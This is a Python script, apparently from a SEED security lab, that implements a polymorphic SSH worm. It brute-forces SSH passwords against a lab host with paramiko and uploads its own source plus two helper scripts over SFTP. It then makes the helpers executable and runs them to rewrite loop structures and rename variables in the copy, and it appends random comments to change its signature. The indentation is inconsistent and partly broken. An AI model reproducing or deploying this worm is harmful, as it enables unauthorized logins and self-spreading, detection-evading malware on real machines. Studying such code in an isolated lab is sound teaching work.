import paramiko
import random 
import os
import ast
import string
import sys
import itertools
NHOSTS = NUSERNAMES = NPASSWDS = 2
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
debug=1
host = '10.0.2.8'
port = 22
username = 'seed'
password = 'dees'
remote_path = './Desktop/new.py'
remote_path_mod = '~'
local_path = './new.py'
local_path_mod = '../mod.sh'
local_path_mut = '../mutate.sh'
i=0
def generate_password():
  words = ['ab','bc','de','es']
  #first = random.choice(words)
 
  for x in words[i:]:#FOR LOOP
        second = random.choice(words)
        return x + second

'''
for\s\+x\s\+in\s\+words\[i:\]
'''		
  
################################################## loop

while True:
        passwd=generate_password()
		    #passwd='dees'
		    
	try:	    
	
		    
      
                    print("\n\ntrying\n"+passwd)
		    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host,port=22,username='seed',password=passwd,timeout=10)
                  
		   
                    # Let's make sure that we move  the  target host 
                        # Read file content
                    with open(local_path, 'r') as f:
                                 file_content = f.read()
                    # Write file content to remote machine
                    with ssh.open_sftp() as sftp:
                        with sftp.open(remote_path, 'w') as remote_file:
                              remote_file.write(file_content)
		
                    with open(local_path_mod, 'r') as f:
            		file_content_mod = f.read()
        	    # exfiltrate mod.sh file content to remote machine
        		with ssh.open_sftp() as sftp:
            		      with sftp.open(remote_path_mod, 'w') as remote_file:
                	      	remote_file.write(file_content_mod)
		    with open(local_path_mut, 'r') as f:
            		file_content_mut = f.read()
        	    # exfiltrate mutate.sh file content to remote machine
        		with ssh.open_sftp() as sftp:
            		      with sftp.open(remote_path_mod, 'w') as remote_file:
                	      	remote_file.write(file_content_mut)

                              # random_comment = f"# Random comment: {random.randint(1, 100)}"
	                      random_comment= "\#"+"Randome comment: "+ str(random.randint(1, 500))

                     # Append the comment to the remote file
                              command000 = 'echo '+ random_comment + ' >> ./Desktop/new.py'
                              stdin, stdout, stderr = ssh.exec_command(command000)
		  
		    	      #scp.put(local_path=local_path1, remote_path=remote_path1) #sus
                    #modify permission 
		              command000 = 'chmod +x ~/mod.sh' #making these files executeable
                              stdin, stdout, stderr = ssh.exec_command(command000)
			      command000 = 'chmod +x ~/mutate.sh'
                              stdin, stdout, stderr = ssh.exec_command(command000)
		            # modfy for to while and applying all sorts of mutations
		              command000 = '~/mod.sh '+"~/Desktop/new.py"
                              stdin, stdout, stderr = ssh.exec_command(command000)
		    #mutate variable names 
			      random_number = str(random.randint(100, 500))
			      command000 = '~/mutate.sh ' + "~/Desktop/new.py" + " command" + random_number
			      print(command000)
			      stdin, stdout, stderr = ssh.exec_command(command000)
			      
			      
			      

		    ssh.close()
                    break    
                    
        except:           
      		
		    i=i+1
		    if i==4:
			i=0			
                    continue


        
print("done")
#Randome comment: 425
#Randome comment: 374
#Randome comment: 268
